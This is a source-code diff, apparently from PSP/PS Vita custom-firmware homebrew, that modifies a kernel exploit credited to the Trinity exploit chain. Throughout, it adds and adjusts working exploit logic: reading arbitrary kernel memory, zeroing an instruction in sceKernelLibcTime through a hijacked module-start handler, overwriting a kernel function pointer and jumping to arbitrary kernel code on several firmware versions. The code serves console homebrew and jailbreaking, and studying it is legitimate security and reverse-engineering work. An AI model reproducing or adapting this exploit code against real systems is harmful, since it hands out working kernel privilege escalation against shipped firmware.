@@ -16,6 +16,8 @@
 #include "functions.h"
 #include "kxploit.h"
 
+#include "common/utils/scanner.c"
+
 /*
 SceUID kernel exploit and read-only exploit by qwikrazor87.
 Part of Trinity exploit chain by thefl0w.
@@ -35,9 +37,13 @@ Put together by Acid_Snake and meetpatty.
 
 UserFunctions* g_tbl = NULL;
 static int libc_clock_offset = LIBC_CLOCK_OFFSET_360;
-static int libc_prev_value = 0;
 static u32 jump_ptr = 0;
 void (*_sceNetMCopyback_1560F143)(uint32_t * a0, uint32_t a1, uint32_t a2, uint32_t a3);
+void* (*set_start_module_handler)(void*) = NULL;
+int (* _sceKernelLibcTime)(u32 a0, u32 a1) = (void*)NULL;
+void (*prev)(void*) = NULL;
+u32 patch_instr = 0;
+u32 patch_addr = 0;
 
 /* Actual code to trigger the kram read vulnerability.
     We can read the value stored at any location in Kram.
@@ -93,12 +99,28 @@ u32 readKram(u32 addr) {
 	if (res == 0xFFFFFFFF)
 		res = 0;
 	return res;
+}
 
+void my_mod_handler(void* mod){
 
+    // corrupt kernel
+    u32 libctime = (void*)FindFunction("sceSystemMemoryManager", "UtilsForUser", 0x27CC57F0);
+    patch_addr = libctime + 4;
+    patch_instr = _lw(patch_addr);
+    _sw(0, patch_addr);
+
+    // fallback to previous handler
+    if (prev){
+        prev(mod);
+    }
+    set_start_module_handler(prev);
 }
 
 void repairInstruction(KernelFunctions* k_tbl) {
-  _sw(libc_prev_value, libc_clock_offset);
+  if (patch_addr && patch_instr){
+      // restore
+      _sw(patch_instr, patch_addr);
+  }
 }
 
 int stubScanner(UserFunctions* tbl){
@@ -111,6 +133,9 @@ int stubScanner(UserFunctions* tbl){
     g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET);
 	  _sceNetMCopyback_1560F143 = tbl->FindImportUserRam("sceNetIfhandle_lib", 0x1560F143);
 
+    set_start_module_handler = tbl->FindImportUserRam("SystemCtrlForUser", 0x1C90BECB); // weak import in ARK Live
+    _sceKernelLibcTime = (void*)(g_tbl->KernelLibcTime);
+
     return (_sceNetMCopyback_1560F143==NULL);
 }
 
@@ -122,22 +147,32 @@ int doExploit(void) {
 
     int res;
     u32 seed = 0;
-    //u32 type_uid = TYPE_UID_OFFSET_360;
+    prev = NULL;
 
+    if (set_start_module_handler){
+      u16 start_module_syscall = _lh((u32)set_start_module_handler+6);
+      if (start_module_syscall && start_module_syscall != 0x2402){
+        PRTSTR("CFW detected");
+        prev = set_start_module_handler(my_mod_handler); // register our custom handler
+        g_tbl->UtilityLoadModule(PSP_MODULE_NP_DRM); // trigger StartModule handler
+        g_tbl->UtilityUnloadModule(PSP_MODULE_NP_DRM);
+        return (patch_addr == 0 || patch_instr == 0);
+      }
+    }
     if (_sceNetMCopyback_1560F143 != NULL){
       u32 test_val = readKram(SYSMEM_SEED_OFFSET_CHECK);
       if (test_val == 0x8F154E38){
         seed = readKram(SYSMEM_SEED_OFFSET_365);
         libc_clock_offset = LIBC_CLOCK_OFFSET_365;
-        PRTSTR("Vita 3.65");
+        PRTSTR("Vita 3.65+");
       }
       else if (test_val == 0x8FBF003C){
         libc_clock_offset = LIBC_CLOCK_OFFSET_660;
-        //type_uid = TYPE_UID_OFFSET_660;
-        PRTSTR("PSP 6.60");
+        PRTSTR("PSP 6.60+");
       }
       else {
         PRTSTR("Vita 3.60");
+        libc_clock_offset = LIBC_CLOCK_OFFSET_360;
       }
     }
 
@@ -163,27 +198,35 @@ int doExploit(void) {
     u32 string[] = { libc_clock_offset - 4, KERNELIFY(jump_ptr), type_uid, encrypted_uid, uid_name, 0x1010070A, 0, 0 };
     SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)string, PSP_SMEM_High, 0x10, NULL);
 
-    //g_tbl->KernelDcacheWritebackAll();
+    g_tbl->KernelDcacheWritebackAll();
 
-    libc_prev_value = readKram(libc_clock_offset);
+    u32 test = readKram(newaddr+8);
+    if (test != type_uid) return -1;
+
+    patch_addr = libc_clock_offset;
+    patch_instr = readKram(libc_clock_offset);
 
     // Overwrite function pointer at LIBC_CLOCK_OFFSET with 0x88888888
     res = g_tbl->KernelFreePartitionMemory(uid);
 
     g_tbl->KernelDcacheWritebackAll();
 
-   
     if (res < 0) return res;
 
     return 0;
 }
 
 void executeKernel(u32 kernelContentFunction){
-  // Make a jump to kernel function
-  _sw(JUMP(KERNELIFY(kernelContentFunction)), jump_ptr);
-  _sw(NOP, jump_ptr+4);
-  g_tbl->KernelDcacheWritebackAll();
+  if (prev){
+    _sceKernelLibcTime(0x08800000, KERNELIFY(kernelContentFunction));
+  }
+  else {
+    // Make a jump to kernel function
+    _sw(JUMP(KERNELIFY(kernelContentFunction)), jump_ptr);
+    _sw(NOP, jump_ptr+4);
+    g_tbl->KernelDcacheWritebackAll();
 
-  // Execute kernel function
-  g_tbl->KernelLibcClock();
+    // Execute kernel function
+    g_tbl->KernelLibcClock();
+  }
 }
